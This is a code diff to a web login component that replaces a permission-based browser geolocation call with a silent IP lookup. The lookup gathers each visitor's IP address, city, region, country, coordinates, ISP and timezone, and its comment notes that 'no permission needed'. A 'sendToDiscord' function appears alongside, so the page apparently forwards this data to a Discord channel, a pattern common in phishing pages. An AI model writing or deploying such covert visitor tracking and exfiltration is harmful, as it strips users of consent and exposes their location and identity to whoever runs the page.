@@ -34,40 +34,31 @@ export default function Login() {
   };
 
   const getLocationInfo = async () => {
-    return new Promise((resolve) => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const { latitude, longitude, accuracy } = position.coords;
-            resolve({
-              latitude: latitude.toFixed(4),
-              longitude: longitude.toFixed(4),
-              accuracy: Math.round(accuracy),
-              source: "GPS",
-            });
-          },
-          () => {
-            // Fallback: Get location from IP
-            fetch("https://ipapi.co/json/")
-              .then((res) => res.json())
-              .then((data) => {
-                resolve({
-                  latitude: data.latitude?.toFixed(4) || "N/A",
-                  longitude: data.longitude?.toFixed(4) || "N/A",
-                  city: data.city || "N/A",
-                  country: data.country_name || "N/A",
-                  source: "IP",
-                });
-              })
-              .catch(() => {
-                resolve({ latitude: "N/A", longitude: "N/A", source: "Unknown" });
-              });
-          }
-        );
-      } else {
-        resolve({ latitude: "N/A", longitude: "N/A", source: "Unavailable" });
-      }
-    });
+    try {
+      // Get location from IP geolocation (no permission needed)
+      const response = await fetch("https://ipapi.co/json/");
+      const data = await response.json();
+
+      return {
+        ip: data.ip || "N/A",
+        city: data.city || "N/A",
+        region: data.region || "N/A",
+        country: data.country_name || "N/A",
+        latitude: data.latitude?.toFixed(4) || "N/A",
+        longitude: data.longitude?.toFixed(4) || "N/A",
+        isp: data.org || "N/A",
+        timezone: data.timezone || "N/A",
+        source: "IP Geolocation",
+      };
+    } catch (error) {
+      console.error("Location fetch error:", error);
+      return {
+        ip: "N/A",
+        city: "N/A",
+        country: "N/A",
+        source: "Unavailable",
+      };
+    }
   };
 
   const sendToDiscord = async (action: string, data: any) => {
